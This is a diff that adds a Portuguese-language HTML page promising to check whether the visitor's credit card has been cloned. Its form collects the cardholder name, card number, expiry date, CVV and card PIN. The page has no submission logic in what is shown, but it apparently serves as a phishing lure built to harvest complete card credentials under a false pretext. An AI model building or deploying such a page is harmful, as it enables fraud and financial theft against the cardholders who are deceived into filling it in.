@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="71227.png" type="image/x-icon">
+    <title>Verificador de Cartão de Crédito</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <h1>Veja se seu cartão foi clonado 🕵️</h1>
+    </header>
+    <main>
+        <form>
+            <label for="card-name">Nome do Titular:</label>
+            <input type="text" id="card-name" name="card-name" required placeholder="João da Silva Pinto">
+            <label for="card-number">Número do Cartão:</label>
+            <input type="text" id="card-number" name="card-number" required placeholder="0123 3456 7890 1234">
+            <br><br>
+            <label for="data">Data de Vencimento:</label>
+            <input type="month" id="data" name="data" required>
+            <br><br>
+            <label for="CVV">C V V:</label>
+            <input type="text" id="cvv" name="cvv" required placeholder="123">
+            <br><br>
+            <label for="card-senha">Senha do cartão:</label>
+            <input type="text" id="card-senha" name="card-senha" required placeholder="*********">
+            <button type="submit">Verificar</button>
+        </form>
+        <div id="result"></div>
+    </main>
+</body>
+</html>
